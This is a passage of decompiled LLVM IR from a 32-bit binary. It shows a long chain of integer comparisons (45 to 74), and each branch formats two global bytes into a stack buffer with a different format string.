  %v5_804a514 = call i32 @szprintf(i32 %v2_804a50d, i32 ptrtoint ([13 x i8]* @global_var_805813f.83 to i32), i32 %v1_804a4fe, i32 %v1_804a4f2)
  br label %dec_label_pc_804a51c

dec_label_pc_804a51c:                             ; preds = %dec_label_pc_804a4ec, %dec_label_pc_804a4f2
  %v12_804a51c = icmp eq i32 %v11_8049ca7, 45
  %v1_804a520 = icmp eq i1 %v12_804a51c, false
  br i1 %v1_804a520, label %dec_label_pc_804a54c, label %dec_label_pc_804a522

dec_label_pc_804a522:                             ; preds = %dec_label_pc_804a51c
  %v0_804a522 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a522 = zext i8 %v0_804a522 to i32
  store i32 %v1_804a522, i32* @edx, align 4
  %v0_804a52e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a52e = zext i8 %v0_804a52e to i32
  %v2_804a53d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a53d, i32* @ebx, align 4
  %v5_804a544 = call i32 @szprintf(i32 %v2_804a53d, i32 ptrtoint ([13 x i8]* @global_var_8058159.85 to i32), i32 %v1_804a52e, i32 %v1_804a522)
  br label %dec_label_pc_804a54c

dec_label_pc_804a54c:                             ; preds = %dec_label_pc_804a51c, %dec_label_pc_804a522
  %v12_804a54c = icmp eq i32 %v11_8049ca7, 46
  %v1_804a550 = icmp eq i1 %v12_804a54c, false
  br i1 %v1_804a550, label %dec_label_pc_804a57c, label %dec_label_pc_804a552

dec_label_pc_804a552:                             ; preds = %dec_label_pc_804a54c
  %v0_804a552 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a552 = zext i8 %v0_804a552 to i32
  store i32 %v1_804a552, i32* @edx, align 4
  %v0_804a55e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a55e = zext i8 %v0_804a55e to i32
  %v2_804a56d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a56d, i32* @ebx, align 4
  %v5_804a574 = call i32 @szprintf(i32 %v2_804a56d, i32 ptrtoint ([13 x i8]* @global_var_8058166.86 to i32), i32 %v1_804a55e, i32 %v1_804a552)
  br label %dec_label_pc_804a57c

dec_label_pc_804a57c:                             ; preds = %dec_label_pc_804a54c, %dec_label_pc_804a552
  %v12_804a57c = icmp eq i32 %v11_8049ca7, 47
  %v1_804a580 = icmp eq i1 %v12_804a57c, false
  br i1 %v1_804a580, label %dec_label_pc_804a5ac, label %dec_label_pc_804a582

dec_label_pc_804a582:                             ; preds = %dec_label_pc_804a57c
  %v0_804a582 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a582 = zext i8 %v0_804a582 to i32
  store i32 %v1_804a582, i32* @edx, align 4
  %v0_804a58e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a58e = zext i8 %v0_804a58e to i32
  %v2_804a59d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a59d, i32* @ebx, align 4
  %v5_804a5a4 = call i32 @szprintf(i32 %v2_804a59d, i32 ptrtoint ([13 x i8]* @global_var_8058173.87 to i32), i32 %v1_804a58e, i32 %v1_804a582)
  br label %dec_label_pc_804a5ac

dec_label_pc_804a5ac:                             ; preds = %dec_label_pc_804a57c, %dec_label_pc_804a582
  %v9_804a5ac = icmp eq i32 %v11_8049ca7, 48
  %v1_804a5b0 = icmp eq i1 %v9_804a5ac, false
  br i1 %v1_804a5b0, label %dec_label_pc_804a5dc, label %dec_label_pc_804a5b2

dec_label_pc_804a5b2:                             ; preds = %dec_label_pc_804a5ac
  %v0_804a5b2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a5b2 = zext i8 %v0_804a5b2 to i32
  store i32 %v1_804a5b2, i32* @edx, align 4
  %v0_804a5be = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a5be = zext i8 %v0_804a5be to i32
  %v2_804a5cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5cd, i32* @ebx, align 4
  %v5_804a5d4 = call i32 @szprintf(i32 %v2_804a5cd, i32 ptrtoint ([13 x i8]* @global_var_8058180.88 to i32), i32 %v1_804a5be, i32 %v1_804a5b2)
  br label %dec_label_pc_804a5dc

dec_label_pc_804a5dc:                             ; preds = %dec_label_pc_804a5ac, %dec_label_pc_804a5b2
  %v12_804a5dc = icmp eq i32 %v11_8049ca7, 49
  %v1_804a5e0 = icmp eq i1 %v12_804a5dc, false
  br i1 %v1_804a5e0, label %dec_label_pc_804a60c, label %dec_label_pc_804a5e2

dec_label_pc_804a5e2:                             ; preds = %dec_label_pc_804a5dc
  %v0_804a5e2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a5e2 = zext i8 %v0_804a5e2 to i32
  store i32 %v1_804a5e2, i32* @edx, align 4
  %v0_804a5ee = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a5ee = zext i8 %v0_804a5ee to i32
  %v2_804a5fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5fd, i32* @ebx, align 4
  %v5_804a604 = call i32 @szprintf(i32 %v2_804a5fd, i32 ptrtoint ([13 x i8]* @global_var_805818d.89 to i32), i32 %v1_804a5ee, i32 %v1_804a5e2)
  br label %dec_label_pc_804a60c

dec_label_pc_804a60c:                             ; preds = %dec_label_pc_804a5dc, %dec_label_pc_804a5e2
  %v12_804a60c = icmp eq i32 %v11_8049ca7, 50
  %v1_804a610 = icmp eq i1 %v12_804a60c, false
  br i1 %v1_804a610, label %dec_label_pc_804a63c, label %dec_label_pc_804a612

dec_label_pc_804a612:                             ; preds = %dec_label_pc_804a60c
  %v0_804a612 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a612 = zext i8 %v0_804a612 to i32
  store i32 %v1_804a612, i32* @edx, align 4
  %v0_804a61e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a61e = zext i8 %v0_804a61e to i32
  %v2_804a62d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a62d, i32* @ebx, align 4
  %v5_804a634 = call i32 @szprintf(i32 %v2_804a62d, i32 ptrtoint ([13 x i8]* @global_var_805819a.90 to i32), i32 %v1_804a61e, i32 %v1_804a612)
  br label %dec_label_pc_804a63c

dec_label_pc_804a63c:                             ; preds = %dec_label_pc_804a60c, %dec_label_pc_804a612
  %v12_804a63c = icmp eq i32 %v11_8049ca7, 51
  %v1_804a640 = icmp eq i1 %v12_804a63c, false
  br i1 %v1_804a640, label %dec_label_pc_804a66c, label %dec_label_pc_804a642

dec_label_pc_804a642:                             ; preds = %dec_label_pc_804a63c
  %v0_804a642 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a642 = zext i8 %v0_804a642 to i32
  store i32 %v1_804a642, i32* @edx, align 4
  %v0_804a64e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a64e = zext i8 %v0_804a64e to i32
  %v2_804a65d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a65d, i32* @ebx, align 4
  %v5_804a664 = call i32 @szprintf(i32 %v2_804a65d, i32 ptrtoint ([14 x i8]* @global_var_80581a7.91 to i32), i32 %v1_804a64e, i32 %v1_804a642)
  br label %dec_label_pc_804a66c

dec_label_pc_804a66c:                             ; preds = %dec_label_pc_804a63c, %dec_label_pc_804a642
  %v12_804a66c = icmp eq i32 %v11_8049ca7, 52
  %v1_804a670 = icmp eq i1 %v12_804a66c, false
  br i1 %v1_804a670, label %dec_label_pc_804a69c, label %dec_label_pc_804a672

dec_label_pc_804a672:                             ; preds = %dec_label_pc_804a66c
  %v0_804a672 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a672 = zext i8 %v0_804a672 to i32
  store i32 %v1_804a672, i32* @edx, align 4
  %v0_804a67e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a67e = zext i8 %v0_804a67e to i32
  %v2_804a68d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a68d, i32* @ebx, align 4
  %v5_804a694 = call i32 @szprintf(i32 %v2_804a68d, i32 ptrtoint ([13 x i8]* @global_var_80581b5.92 to i32), i32 %v1_804a67e, i32 %v1_804a672)
  br label %dec_label_pc_804a69c

dec_label_pc_804a69c:                             ; preds = %dec_label_pc_804a66c, %dec_label_pc_804a672
  %v12_804a69c = icmp eq i32 %v11_8049ca7, 53
  %v1_804a6a0 = icmp eq i1 %v12_804a69c, false
  br i1 %v1_804a6a0, label %dec_label_pc_804a6cc, label %dec_label_pc_804a6a2

dec_label_pc_804a6a2:                             ; preds = %dec_label_pc_804a69c
  %v0_804a6a2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a6a2 = zext i8 %v0_804a6a2 to i32
  store i32 %v1_804a6a2, i32* @edx, align 4
  %v0_804a6ae = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a6ae = zext i8 %v0_804a6ae to i32
  %v2_804a6bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6bd, i32* @ebx, align 4
  %v5_804a6c4 = call i32 @szprintf(i32 %v2_804a6bd, i32 ptrtoint ([14 x i8]* @global_var_80581c2.93 to i32), i32 %v1_804a6ae, i32 %v1_804a6a2)
  br label %dec_label_pc_804a6cc

dec_label_pc_804a6cc:                             ; preds = %dec_label_pc_804a69c, %dec_label_pc_804a6a2
  %v12_804a6cc = icmp eq i32 %v11_8049ca7, 54
  %v1_804a6d0 = icmp eq i1 %v12_804a6cc, false
  br i1 %v1_804a6d0, label %dec_label_pc_804a6fc, label %dec_label_pc_804a6d2

dec_label_pc_804a6d2:                             ; preds = %dec_label_pc_804a6cc
  %v0_804a6d2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a6d2 = zext i8 %v0_804a6d2 to i32
  store i32 %v1_804a6d2, i32* @edx, align 4
  %v0_804a6de = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a6de = zext i8 %v0_804a6de to i32
  %v2_804a6ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6ed, i32* @ebx, align 4
  %v5_804a6f4 = call i32 @szprintf(i32 %v2_804a6ed, i32 ptrtoint ([13 x i8]* @global_var_80581d0.94 to i32), i32 %v1_804a6de, i32 %v1_804a6d2)
  br label %dec_label_pc_804a6fc

dec_label_pc_804a6fc:                             ; preds = %dec_label_pc_804a6cc, %dec_label_pc_804a6d2
  %v12_804a6fc = icmp eq i32 %v11_8049ca7, 55
  %v1_804a700 = icmp eq i1 %v12_804a6fc, false
  br i1 %v1_804a700, label %dec_label_pc_804a72c, label %dec_label_pc_804a702

dec_label_pc_804a702:                             ; preds = %dec_label_pc_804a6fc
  %v0_804a702 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a702 = zext i8 %v0_804a702 to i32
  store i32 %v1_804a702, i32* @edx, align 4
  %v0_804a70e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a70e = zext i8 %v0_804a70e to i32
  %v2_804a71d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a71d, i32* @ebx, align 4
  %v5_804a724 = call i32 @szprintf(i32 %v2_804a71d, i32 ptrtoint ([14 x i8]* @global_var_80581dd.95 to i32), i32 %v1_804a70e, i32 %v1_804a702)
  br label %dec_label_pc_804a72c

dec_label_pc_804a72c:                             ; preds = %dec_label_pc_804a6fc, %dec_label_pc_804a702
  %v12_804a72c = icmp eq i32 %v11_8049ca7, 56
  %v1_804a730 = icmp eq i1 %v12_804a72c, false
  br i1 %v1_804a730, label %dec_label_pc_804a75c, label %dec_label_pc_804a732

dec_label_pc_804a732:                             ; preds = %dec_label_pc_804a72c
  %v0_804a732 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a732 = zext i8 %v0_804a732 to i32
  store i32 %v1_804a732, i32* @edx, align 4
  %v0_804a73e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a73e = zext i8 %v0_804a73e to i32
  %v2_804a74d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a74d, i32* @ebx, align 4
  %v5_804a754 = call i32 @szprintf(i32 %v2_804a74d, i32 ptrtoint ([14 x i8]* @global_var_80581eb.96 to i32), i32 %v1_804a73e, i32 %v1_804a732)
  br label %dec_label_pc_804a75c

dec_label_pc_804a75c:                             ; preds = %dec_label_pc_804a72c, %dec_label_pc_804a732
  %v12_804a75c = icmp eq i32 %v11_8049ca7, 57
  %v1_804a760 = icmp eq i1 %v12_804a75c, false
  br i1 %v1_804a760, label %dec_label_pc_804a78c, label %dec_label_pc_804a762

dec_label_pc_804a762:                             ; preds = %dec_label_pc_804a75c
  %v0_804a762 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a762 = zext i8 %v0_804a762 to i32
  store i32 %v1_804a762, i32* @edx, align 4
  %v0_804a76e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a76e = zext i8 %v0_804a76e to i32
  %v2_804a77d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a77d, i32* @ebx, align 4
  %v5_804a784 = call i32 @szprintf(i32 %v2_804a77d, i32 ptrtoint ([13 x i8]* @global_var_80581f9.97 to i32), i32 %v1_804a76e, i32 %v1_804a762)
  br label %dec_label_pc_804a78c

dec_label_pc_804a78c:                             ; preds = %dec_label_pc_804a75c, %dec_label_pc_804a762
  %v12_804a78c = icmp eq i32 %v11_8049ca7, 58
  %v1_804a790 = icmp eq i1 %v12_804a78c, false
  br i1 %v1_804a790, label %dec_label_pc_804a7bc, label %dec_label_pc_804a792

dec_label_pc_804a792:                             ; preds = %dec_label_pc_804a78c
  %v0_804a792 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a792 = zext i8 %v0_804a792 to i32
  store i32 %v1_804a792, i32* @edx, align 4
  %v0_804a79e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a79e = zext i8 %v0_804a79e to i32
  %v2_804a7ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7ad, i32* @ebx, align 4
  %v5_804a7b4 = call i32 @szprintf(i32 %v2_804a7ad, i32 ptrtoint ([13 x i8]* @global_var_8058206.98 to i32), i32 %v1_804a79e, i32 %v1_804a792)
  br label %dec_label_pc_804a7bc

dec_label_pc_804a7bc:                             ; preds = %dec_label_pc_804a78c, %dec_label_pc_804a792
  %v12_804a7bc = icmp eq i32 %v11_8049ca7, 59
  %v1_804a7c0 = icmp eq i1 %v12_804a7bc, false
  br i1 %v1_804a7c0, label %dec_label_pc_804a7ec, label %dec_label_pc_804a7c2

dec_label_pc_804a7c2:                             ; preds = %dec_label_pc_804a7bc
  %v0_804a7c2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a7c2 = zext i8 %v0_804a7c2 to i32
  store i32 %v1_804a7c2, i32* @edx, align 4
  %v0_804a7ce = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a7ce = zext i8 %v0_804a7ce to i32
  %v2_804a7dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7dd, i32* @ebx, align 4
  %v5_804a7e4 = call i32 @szprintf(i32 %v2_804a7dd, i32 ptrtoint ([13 x i8]* @global_var_8058213.99 to i32), i32 %v1_804a7ce, i32 %v1_804a7c2)
  br label %dec_label_pc_804a7ec

dec_label_pc_804a7ec:                             ; preds = %dec_label_pc_804a7bc, %dec_label_pc_804a7c2
  %v12_804a7ec = icmp eq i32 %v11_8049ca7, 60
  %v1_804a7f0 = icmp eq i1 %v12_804a7ec, false
  br i1 %v1_804a7f0, label %dec_label_pc_804a81c, label %dec_label_pc_804a7f2

dec_label_pc_804a7f2:                             ; preds = %dec_label_pc_804a7ec
  %v0_804a7f2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a7f2 = zext i8 %v0_804a7f2 to i32
  store i32 %v1_804a7f2, i32* @edx, align 4
  %v0_804a7fe = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a7fe = zext i8 %v0_804a7fe to i32
  %v2_804a80d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a80d, i32* @ebx, align 4
  %v5_804a814 = call i32 @szprintf(i32 %v2_804a80d, i32 ptrtoint ([13 x i8]* @global_var_8058220.100 to i32), i32 %v1_804a7fe, i32 %v1_804a7f2)
  br label %dec_label_pc_804a81c

dec_label_pc_804a81c:                             ; preds = %dec_label_pc_804a7ec, %dec_label_pc_804a7f2
  %v12_804a81c = icmp eq i32 %v11_8049ca7, 61
  %v1_804a820 = icmp eq i1 %v12_804a81c, false
  br i1 %v1_804a820, label %dec_label_pc_804a84c, label %dec_label_pc_804a822

dec_label_pc_804a822:                             ; preds = %dec_label_pc_804a81c
  %v0_804a822 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a822 = zext i8 %v0_804a822 to i32
  store i32 %v1_804a822, i32* @edx, align 4
  %v0_804a82e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a82e = zext i8 %v0_804a82e to i32
  %v2_804a83d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a83d, i32* @ebx, align 4
  %v5_804a844 = call i32 @szprintf(i32 %v2_804a83d, i32 ptrtoint ([13 x i8]* @global_var_805822d.101 to i32), i32 %v1_804a82e, i32 %v1_804a822)
  br label %dec_label_pc_804a84c

dec_label_pc_804a84c:                             ; preds = %dec_label_pc_804a81c, %dec_label_pc_804a822
  %v12_804a84c = icmp eq i32 %v11_8049ca7, 62
  %v1_804a850 = icmp eq i1 %v12_804a84c, false
  br i1 %v1_804a850, label %dec_label_pc_804a87c, label %dec_label_pc_804a852

dec_label_pc_804a852:                             ; preds = %dec_label_pc_804a84c
  %v0_804a852 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a852 = zext i8 %v0_804a852 to i32
  store i32 %v1_804a852, i32* @edx, align 4
  %v0_804a85e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a85e = zext i8 %v0_804a85e to i32
  %v2_804a86d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a86d, i32* @ebx, align 4
  %v5_804a874 = call i32 @szprintf(i32 %v2_804a86d, i32 ptrtoint ([13 x i8]* @global_var_805823a.102 to i32), i32 %v1_804a85e, i32 %v1_804a852)
  br label %dec_label_pc_804a87c

dec_label_pc_804a87c:                             ; preds = %dec_label_pc_804a84c, %dec_label_pc_804a852
  %v12_804a87c = icmp eq i32 %v11_8049ca7, 63
  %v1_804a880 = icmp eq i1 %v12_804a87c, false
  br i1 %v1_804a880, label %dec_label_pc_804a8ac, label %dec_label_pc_804a882

dec_label_pc_804a882:                             ; preds = %dec_label_pc_804a87c
  %v0_804a882 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a882 = zext i8 %v0_804a882 to i32
  store i32 %v1_804a882, i32* @edx, align 4
  %v0_804a88e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a88e = zext i8 %v0_804a88e to i32
  %v2_804a89d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a89d, i32* @ebx, align 4
  %v5_804a8a4 = call i32 @szprintf(i32 %v2_804a89d, i32 ptrtoint ([13 x i8]* @global_var_8058247.103 to i32), i32 %v1_804a88e, i32 %v1_804a882)
  br label %dec_label_pc_804a8ac

dec_label_pc_804a8ac:                             ; preds = %dec_label_pc_804a87c, %dec_label_pc_804a882
  %v9_804a8ac = icmp eq i32 %v11_8049ca7, 64
  %v1_804a8b0 = icmp eq i1 %v9_804a8ac, false
  br i1 %v1_804a8b0, label %dec_label_pc_804a8dc, label %dec_label_pc_804a8b2

dec_label_pc_804a8b2:                             ; preds = %dec_label_pc_804a8ac
  %v0_804a8b2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a8b2 = zext i8 %v0_804a8b2 to i32
  store i32 %v1_804a8b2, i32* @edx, align 4
  %v0_804a8be = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a8be = zext i8 %v0_804a8be to i32
  %v2_804a8cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8cd, i32* @ebx, align 4
  %v5_804a8d4 = call i32 @szprintf(i32 %v2_804a8cd, i32 ptrtoint ([13 x i8]* @global_var_8058254.104 to i32), i32 %v1_804a8be, i32 %v1_804a8b2)
  br label %dec_label_pc_804a8dc

dec_label_pc_804a8dc:                             ; preds = %dec_label_pc_804a8ac, %dec_label_pc_804a8b2
  %v12_804a8dc = icmp eq i32 %v11_8049ca7, 65
  %v1_804a8e0 = icmp eq i1 %v12_804a8dc, false
  br i1 %v1_804a8e0, label %dec_label_pc_804a90c, label %dec_label_pc_804a8e2

dec_label_pc_804a8e2:                             ; preds = %dec_label_pc_804a8dc
  %v0_804a8e2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a8e2 = zext i8 %v0_804a8e2 to i32
  store i32 %v1_804a8e2, i32* @edx, align 4
  %v0_804a8ee = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a8ee = zext i8 %v0_804a8ee to i32
  %v2_804a8fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8fd, i32* @ebx, align 4
  %v5_804a904 = call i32 @szprintf(i32 %v2_804a8fd, i32 ptrtoint ([13 x i8]* @global_var_8058261.105 to i32), i32 %v1_804a8ee, i32 %v1_804a8e2)
  br label %dec_label_pc_804a90c

dec_label_pc_804a90c:                             ; preds = %dec_label_pc_804a8dc, %dec_label_pc_804a8e2
  %v12_804a90c = icmp eq i32 %v11_8049ca7, 66
  %v1_804a910 = icmp eq i1 %v12_804a90c, false
  br i1 %v1_804a910, label %dec_label_pc_804a93c, label %dec_label_pc_804a912

dec_label_pc_804a912:                             ; preds = %dec_label_pc_804a90c
  %v0_804a912 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a912 = zext i8 %v0_804a912 to i32
  store i32 %v1_804a912, i32* @edx, align 4
  %v0_804a91e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a91e = zext i8 %v0_804a91e to i32
  %v2_804a92d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a92d, i32* @ebx, align 4
  %v5_804a934 = call i32 @szprintf(i32 %v2_804a92d, i32 ptrtoint ([13 x i8]* @global_var_805826e.106 to i32), i32 %v1_804a91e, i32 %v1_804a912)
  br label %dec_label_pc_804a93c

dec_label_pc_804a93c:                             ; preds = %dec_label_pc_804a90c, %dec_label_pc_804a912
  %v12_804a93c = icmp eq i32 %v11_8049ca7, 67
  %v1_804a940 = icmp eq i1 %v12_804a93c, false
  br i1 %v1_804a940, label %dec_label_pc_804a96c, label %dec_label_pc_804a942

dec_label_pc_804a942:                             ; preds = %dec_label_pc_804a93c
  %v0_804a942 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a942 = zext i8 %v0_804a942 to i32
  store i32 %v1_804a942, i32* @edx, align 4
  %v0_804a94e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a94e = zext i8 %v0_804a94e to i32
  %v2_804a95d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a95d, i32* @ebx, align 4
  %v5_804a964 = call i32 @szprintf(i32 %v2_804a95d, i32 ptrtoint ([13 x i8]* @global_var_805827b.107 to i32), i32 %v1_804a94e, i32 %v1_804a942)
  br label %dec_label_pc_804a96c

dec_label_pc_804a96c:                             ; preds = %dec_label_pc_804a93c, %dec_label_pc_804a942
  %v12_804a96c = icmp eq i32 %v11_8049ca7, 68
  %v1_804a970 = icmp eq i1 %v12_804a96c, false
  br i1 %v1_804a970, label %dec_label_pc_804a99c, label %dec_label_pc_804a972

dec_label_pc_804a972:                             ; preds = %dec_label_pc_804a96c
  %v0_804a972 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a972 = zext i8 %v0_804a972 to i32
  store i32 %v1_804a972, i32* @edx, align 4
  %v0_804a97e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a97e = zext i8 %v0_804a97e to i32
  %v2_804a98d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a98d, i32* @ebx, align 4
  %v5_804a994 = call i32 @szprintf(i32 %v2_804a98d, i32 ptrtoint ([13 x i8]* @global_var_8058288.108 to i32), i32 %v1_804a97e, i32 %v1_804a972)
  br label %dec_label_pc_804a99c

dec_label_pc_804a99c:                             ; preds = %dec_label_pc_804a96c, %dec_label_pc_804a972
  %v12_804a99c = icmp eq i32 %v11_8049ca7, 69
  %v1_804a9a0 = icmp eq i1 %v12_804a99c, false
  br i1 %v1_804a9a0, label %dec_label_pc_804a9cc, label %dec_label_pc_804a9a2

dec_label_pc_804a9a2:                             ; preds = %dec_label_pc_804a99c
  %v0_804a9a2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a9a2 = zext i8 %v0_804a9a2 to i32
  store i32 %v1_804a9a2, i32* @edx, align 4
  %v0_804a9ae = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a9ae = zext i8 %v0_804a9ae to i32
  %v2_804a9bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9bd, i32* @ebx, align 4
  %v5_804a9c4 = call i32 @szprintf(i32 %v2_804a9bd, i32 ptrtoint ([13 x i8]* @global_var_8058295.109 to i32), i32 %v1_804a9ae, i32 %v1_804a9a2)
  br label %dec_label_pc_804a9cc

dec_label_pc_804a9cc:                             ; preds = %dec_label_pc_804a99c, %dec_label_pc_804a9a2
  %v12_804a9cc = icmp eq i32 %v11_8049ca7, 70
  %v1_804a9d0 = icmp eq i1 %v12_804a9cc, false
  br i1 %v1_804a9d0, label %dec_label_pc_804a9fc, label %dec_label_pc_804a9d2

dec_label_pc_804a9d2:                             ; preds = %dec_label_pc_804a9cc
  %v0_804a9d2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a9d2 = zext i8 %v0_804a9d2 to i32
  store i32 %v1_804a9d2, i32* @edx, align 4
  %v0_804a9de = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a9de = zext i8 %v0_804a9de to i32
  %v2_804a9ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9ed, i32* @ebx, align 4
  %v5_804a9f4 = call i32 @szprintf(i32 %v2_804a9ed, i32 ptrtoint ([13 x i8]* @global_var_80582a2.110 to i32), i32 %v1_804a9de, i32 %v1_804a9d2)
  br label %dec_label_pc_804a9fc

dec_label_pc_804a9fc:                             ; preds = %dec_label_pc_804a9cc, %dec_label_pc_804a9d2
  %v12_804a9fc = icmp eq i32 %v11_8049ca7, 71
  %v1_804aa00 = icmp eq i1 %v12_804a9fc, false
  br i1 %v1_804aa00, label %dec_label_pc_804aa2c, label %dec_label_pc_804aa02

dec_label_pc_804aa02:                             ; preds = %dec_label_pc_804a9fc
  %v0_804aa02 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804aa02 = zext i8 %v0_804aa02 to i32
  store i32 %v1_804aa02, i32* @edx, align 4
  %v0_804aa0e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804aa0e = zext i8 %v0_804aa0e to i32
  %v2_804aa1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa1d, i32* @ebx, align 4
  %v5_804aa24 = call i32 @szprintf(i32 %v2_804aa1d, i32 ptrtoint ([13 x i8]* @global_var_80582af.111 to i32), i32 %v1_804aa0e, i32 %v1_804aa02)
  br label %dec_label_pc_804aa2c

dec_label_pc_804aa2c:                             ; preds = %dec_label_pc_804a9fc, %dec_label_pc_804aa02
  %v12_804aa2c = icmp eq i32 %v11_8049ca7, 72
  %v1_804aa30 = icmp eq i1 %v12_804aa2c, false
  br i1 %v1_804aa30, label %dec_label_pc_804aa5c, label %dec_label_pc_804aa32

dec_label_pc_804aa32:                             ; preds = %dec_label_pc_804aa2c
  %v0_804aa32 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804aa32 = zext i8 %v0_804aa32 to i32
  store i32 %v1_804aa32, i32* @edx, align 4
  %v0_804aa3e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804aa3e = zext i8 %v0_804aa3e to i32
  %v2_804aa4d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa4d, i32* @ebx, align 4
  %v5_804aa54 = call i32 @szprintf(i32 %v2_804aa4d, i32 ptrtoint ([13 x i8]* @global_var_80582bc.112 to i32), i32 %v1_804aa3e, i32 %v1_804aa32)
  br label %dec_label_pc_804aa5c

dec_label_pc_804aa5c:                             ; preds = %dec_label_pc_804aa2c, %dec_label_pc_804aa32
  %v12_804aa5c = icmp eq i32 %v11_8049ca7, 73
  %v1_804aa60 = icmp eq i1 %v12_804aa5c, false
  br i1 %v1_804aa60, label %dec_label_pc_804aa8c, label %dec_label_pc_804aa62

dec_label_pc_804aa62:                             ; preds = %dec_label_pc_804aa5c
  %v0_804aa62 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804aa62 = zext i8 %v0_804aa62 to i32
  store i32 %v1_804aa62, i32* @edx, align 4
  %v0_804aa6e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804aa6e = zext i8 %v0_804aa6e to i32
  %v2_804aa7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa7d, i32* @ebx, align 4
  %v5_804aa84 = call i32 @szprintf(i32 %v2_804aa7d, i32 ptrtoint ([13 x i8]* @global_var_80582c9.113 to i32), i32 %v1_804aa6e, i32 %v1_804aa62)
  br label %dec_label_pc_804aa8c

dec_label_pc_804aa8c:                             ; preds = %dec_label_pc_804aa5c, %dec_label_pc_804aa62
  %v12_804aa8c = icmp eq i32 %v11_8049ca7, 74
  %v1_804aa90 = icmp eq i1 %v12_804aa8c, false
  br i1 %v1_804aa90, label %dec_label_pc_804aabc, label %dec_label_pc_804aa92

dec_label_pc_804aa92:                             ; preds = %dec_label_pc_804aa8c
  %v0_804aa92 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804aa92 = zext i8 %v0_804aa92 to i32
  store i32 %v1_804aa92, i32* @edx, align 4
